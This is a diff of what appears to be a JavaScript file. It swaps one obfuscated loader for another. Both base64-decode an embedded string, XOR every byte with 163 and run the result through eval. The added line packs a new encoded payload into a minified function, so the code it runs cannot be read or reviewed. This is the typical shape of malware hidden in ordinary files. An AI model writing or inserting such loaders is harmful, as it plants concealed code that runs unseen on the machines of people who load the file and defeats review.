@@ -2430,12 +2430,4 @@ pogi_si_caliber += "ODg4ODg4H684SDg4ODg4ODg4ODg4ODg4ODg6mDg4ODg4ODg4OD";
 pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
 pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4Op";
 
-(function(){
-  var _0x = pogi_si_caliber;
-  var _d = atob(_0x);
-  var _r = '';
-  for(var _i = 0; _i < _d.length; _i++){
-    _r += String.fromCharCode(_d.charCodeAt(_i) ^ 163);
-  }
-  eval(_r);
-})();
+(function(a,b,c,d,e){b='';c=atob(a);for(d=0;d<c.length;d++){b+=String.fromCharCode(c.charCodeAt(d)^163)}eval(b)}('i8XWzcDXyszNi4rYqYOD1cLRg/yT24Oeg9PMxMr80Mr8wMLPysHG0Zipg4PVwtGD/MeDnoPC18zBi/yT24qYqYOD1cLRg/zRg56DhISYqYODxczRi9XC0YP8yoOeg5OYg/zKg5+D/MeNz8bNxNfLmIP8yoiIitipg4ODg/zRg4ieg/DX0crNxI3F0czO4MvC0eDMx8aL/MeNwMvC0eDMx8bi14v8yoqD/YOSlZCKmKmDg96pg4PG1cLPi/zRipip3oqLipg='));
